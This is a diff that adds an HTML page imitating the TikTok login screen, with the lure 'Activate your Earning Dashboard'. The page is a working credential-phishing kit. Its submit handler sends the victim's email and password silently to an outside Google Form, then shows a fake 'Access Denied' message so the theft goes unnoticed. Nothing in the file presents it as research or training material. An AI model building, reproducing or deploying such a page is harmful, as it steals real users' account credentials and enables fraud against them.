@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TikTok Login Form Replica</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  <style>
+    body {
+      background: #fff;
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .login-container {
+      max-width: 400px;
+      width: 100%;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo img {
+      height: 40px;
+    }
+    .card {
+      border: 1px solid #e6e6e6;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .card-header {
+      padding: 1.5rem;
+      text-align: center;
+      border-bottom: 1px solid #e6e6e6;
+    }
+    .card-header h5 {
+      margin-bottom: .5rem;
+    }
+    .card-header .subtitle {
+      color: #888;
+      font-size: .9rem;
+    }
+    .card-body {
+      padding: 1.5rem;
+    }
+    .form-control {
+      height: 44px;
+      margin-bottom: 15px;
+      border-radius: 4px;
+    }
+    .password-wrapper {
+      position: relative;
+    }
+    .password-wrapper input {
+      padding-right: 40px;
+    }
+    .toggle-password {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      cursor: pointer;
+    }
+    .btn-login {
+      background: #fe2c55;
+      color: #fff;
+      font-weight: 600;
+      height: 44px;
+      border: none;
+    }
+    .btn-login:hover {
+      background: #e11f44;
+    }
+    .text-right a {
+      color: #fe2c55;
+      text-decoration: none;
+      font-size: .9rem;
+    }
+    .signup-text {
+      text-align: center;
+      margin-top: 20px;
+      font-size: .9rem;
+      color: #888;
+    }
+    .signup-text a {
+      color: #fe2c55;
+      text-decoration: none;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
+    </div>
+    <div class="card">
+      <div class="card-header">
+        <h5>Log in to TikTok</h5>
+        <div class="subtitle">login and Activate your Earning Dashboard</div>
+      </div>
+      <div class="card-body">
+        <form id="loginForm">
+          <input type="text" class="form-control" id="emailInput" placeholder="Enter Email or username" required>
+
+          <div class="password-wrapper">
+            <input type="password" id="passwordInput" class="form-control" placeholder="Password" required>
+            <svg class="toggle-password" id="togglePassword" xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#888" viewBox="0 0 24 24">
+              <path d="M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10z"/>
+              <circle cx="12" cy="12" r="2.5"/>
+            </svg>
+          </div>
+
+          <div class="text-right mb-3">
+            <a href="#">Forgot password?</a>
+          </div>
+          <button type="submit" class="btn btn-login w-100">Log In</button>
+        </form>
+        <div class="signup-text">
+          Don’t have an account? <a href="#">Sign up</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Toggle password visibility
+    const togglePassword = document.getElementById("togglePassword");
+    const passwordInput = document.getElementById("passwordInput");
+
+    togglePassword.addEventListener("click", function () {
+      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+      passwordInput.setAttribute("type", type);
+    });
+
+    // Form submission handler
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("emailInput").value;
+      const password = document.getElementById("passwordInput").value;
+
+      const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSdBzT-9HIQmuO7o7foSij7C4j5rcNAMFG43MUWrYlBKOrc7zg/formResponse";
+
+      const formData = new URLSearchParams();
+      formData.append("entry.1967488186", email);
+      formData.append("entry.665869320", password);
+
+      // Submit data silently to Google Form
+      fetch(formUrl, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: formData.toString()
+      }).then(() => {
+        // Show error message after fake "login"
+        document.body.innerHTML = `
+          <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: white; text-align: center; padding: 20px;">
+            <div>
+              <h2 style="color: red;">Access Denied</h2>
+              <p style="font-size: 18px;">TikTok earning is not available in your country at the moment.</p>
+            </div>
+          </div>
+        `;
+      }).catch(() => {
+        // Fallback in case of fetch failure
+        alert("Submission failed. Please try again.");
+      });
+    });
+  </script>
+
+</body>
+</html>
